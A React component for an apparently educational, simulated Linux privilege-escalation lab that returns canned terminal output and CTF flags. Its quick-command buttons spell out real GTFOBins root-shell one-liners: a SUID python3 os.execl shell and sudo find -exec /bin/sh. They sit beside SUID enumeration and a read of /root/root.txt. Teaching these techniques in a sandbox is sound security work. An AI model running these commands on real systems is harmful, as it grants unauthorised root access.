import React, { useState } from 'react';
import { Terminal, Play, RotateCcw, CheckCircle2, ShieldAlert, Cpu, Sparkles, Key } from 'lucide-react';

export default function LinuxPrivEscLab() {
  const [isRoot, setIsRoot] = useState<boolean>(false);
  const [currentInput, setCurrentInput] = useState<string>('');
  const [history, setHistory] = useState<Array<{ cmd: string; output: string; prompt: string }>>([
    {
      prompt: 'negi@kali-host:~$',
      cmd: 'id',
      output: 'uid=1001(negi) gid=1001(negi) groups=1001(negi),27(sudo)',
    },
  ]);

  const quickCommands = [
    { label: 'Check Current ID', cmd: 'id' },
    { label: 'Check Sudo Permissions', cmd: 'sudo -l' },
    { label: 'Find SUID Binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null' },
    { label: 'Exploit SUID Python (GTFOBins)', cmd: "/usr/bin/python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" },
    { label: 'Exploit Sudo Find (Root Shell)', cmd: 'sudo find . -exec /bin/sh \\; -quit' },
    { label: 'Read /root/root.txt', cmd: 'cat /root/root.txt' },
  ];

  const executeCommand = (cmdText: string) => {
    const trimmed = cmdText.trim();
    if (!trimmed) return;

    const currentPrompt = isRoot ? 'root@kali-host:/root#' : 'negi@kali-host:~$';
    let output = '';

    if (trimmed === 'clear') {
      setHistory([]);
      setCurrentInput('');
      return;
    }

    if (trimmed === 'id') {
      output = isRoot
        ? 'uid=0(root) gid=0(root) groups=0(root)'
        : 'uid=1001(negi) gid=1001(negi) groups=1001(negi)';
    } else if (trimmed === 'whoami') {
      output = isRoot ? 'root' : 'negi';
    } else if (trimmed.includes('sudo -l')) {
      output = `Matching Defaults entries for negi on kali-host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin

User negi may run the following commands on kali-host:
    (root) NOPASSWD: /usr/bin/find`;
    } else if (trimmed.includes('find / -perm -4000')) {
      output = `/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/python3  <-- [VULNERABLE SUID BINARY IDENTIFIED!]
/usr/bin/passwd
/usr/bin/pkexec`;
    } else if (trimmed.includes('python3') && trimmed.includes('execl')) {
      setIsRoot(true);
      output = `[+] Executing SUID binary retain privileges...
[+] Spawning elevated shell /bin/sh -p
[+] PRIVILEGE ESCALATION SUCCESSFUL: Welcome to ROOT!
[+] CTF FLAG: FLAG{SUID_PYTHON_ROOT_PWNED_2026}`;
    } else if (trimmed.includes('sudo find') && trimmed.includes('-exec')) {
      setIsRoot(true);
      output = `[+] Spawning root shell via Sudo NOPASSWD GTFOBins...
[+] Interactive root shell initialized (euid=0).
[+] CTF FLAG: FLAG{SUDO_FIND_GTFOBINS_ROOT_PWNED}`;
    } else if (trimmed === 'cat /root/root.txt') {
      if (isRoot) {
        output = `*****************************************************
* CONGRATULATIONS! FULL SYSTEM COMPROMISE ACHIEVED *
* Root Flag: FLAG{SUID_GTFOBINS_ROOT_SHELL_PWNED_2026} *
*****************************************************`;
      } else {
        output = 'cat: /root/root.txt: Permission denied';
      }
    } else {
      output = `bash: ${trimmed}: command not found. Try one of the quick commands above.`;
    }

    setHistory(prev => [...prev, { prompt: currentPrompt, cmd: trimmed, output }]);
    setCurrentInput('');
  };

  return (
    <div className="rounded-2xl border border-white/10 bg-black/60 p-6 md:p-8 backdrop-blur-xl shadow-2xl">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-white/10">
        <div className="flex items-center gap-3">
          <div className="p-2.5 rounded-xl bg-neon-green/10 border border-neon-green/30 text-neon-green">
            <Terminal className="w-6 h-6" />
          </div>
          <div>
            <h3 className="text-lg font-bold text-white flex items-center gap-2">
              Linux Privilege Escalation Shell Lab
              <span className="text-xs font-mono px-2 py-0.5 rounded-full bg-neon-green/20 text-neon-green border border-neon-green/30">
                LIVE INTERACTIVE LAB
              </span>
            </h3>
            <p className="text-xs font-mono text-gray-400">GTFOBins & SUID Binary Misconfiguration Exploiter</p>
          </div>
        </div>

        {/* Current State Indicator */}
        <div className={`px-4 py-2 rounded-xl font-mono text-xs font-bold border transition-all flex items-center gap-2 ${
          isRoot
            ? 'bg-neon-green/20 text-neon-green border-neon-green shadow-[0_0_20px_rgba(0,255,159,0.4)]'
            : 'bg-white/5 text-gray-400 border-white/10'
        }`}>
          {isRoot ? '● ROOT PRIVILEGES (UID 0)' : '○ UNPRIVILEGED USER (UID 1001)'}
        </div>
      </div>

      {/* Quick Exploits & Commands Toolbar */}
      <div className="my-6">
        <label className="text-xs font-mono text-gray-400 block mb-2">GTFOBINS & RECON PAYLOADS:</label>
        <div className="flex flex-wrap gap-2">
          {quickCommands.map((qc, idx) => (
            <button
              key={idx}
              onClick={() => executeCommand(qc.cmd)}
              className="px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 text-gray-300 hover:text-white font-mono text-xs transition-all cursor-pointer"
            >
              {qc.label}
            </button>
          ))}
          <button
            onClick={() => {
              setIsRoot(false);
              setHistory([
                {
                  prompt: 'negi@kali-host:~$',
                  cmd: 'id',
                  output: 'uid=1001(negi) gid=1001(negi) groups=1001(negi),27(sudo)',
                },
              ]);
            }}
            className="px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-red-300 font-mono text-xs transition-all cursor-pointer"
          >
            Reset Session
          </button>
        </div>
      </div>

      {/* Interactive Terminal Screen */}
      <div className="rounded-xl border border-white/20 bg-black/95 p-5 font-mono text-xs shadow-inner min-h-[320px] flex flex-col justify-between">
        <div className="space-y-3 overflow-y-auto max-h-[380px] pr-2">
          <div className="text-gray-500 border-b border-white/5 pb-2 text-[11px]">
            Linux kali-host 5.15.0-89-generic #99-Ubuntu SMP x86_64 | Target Machine Session Initialized
          </div>

          {history.map((item, idx) => (
            <div key={idx} className="space-y-1">
              <div className="flex items-center gap-2">
                <span className={item.prompt.includes('root') ? 'text-neon-green font-bold' : 'text-blue-400 font-bold'}>
                  {item.prompt}
                </span>
                <span className="text-white">{item.cmd}</span>
              </div>
              <pre className="text-gray-300 whitespace-pre-wrap pl-2 border-l border-white/10 text-[11px] leading-relaxed">
                {item.output}
              </pre>
            </div>
          ))}
        </div>

        {/* Input Bar */}
        <form
          onSubmit={(e) => {
            e.preventDefault();
            executeCommand(currentInput);
          }}
          className="mt-4 pt-3 border-t border-white/10 flex items-center gap-2"
        >
          <span className={isRoot ? 'text-neon-green font-bold' : 'text-blue-400 font-bold'}>
            {isRoot ? 'root@kali-host:/root#' : 'negi@kali-host:~$'}
          </span>
          <input
            type="text"
            value={currentInput}
            onChange={(e) => setCurrentInput(e.target.value)}
            className="flex-1 bg-transparent text-white font-mono text-xs focus:outline-none placeholder-gray-600"
            placeholder="Type bash command (e.g. whoami, id, sudo -l)..."
            autoFocus
          />
          <button
            type="submit"
            className="px-4 py-1.5 rounded-lg bg-neon-green text-black font-bold font-mono text-xs hover:bg-opacity-90 transition-all cursor-pointer"
          >
            Run
          </button>
        </form>
      </div>
    </div>
  );
}
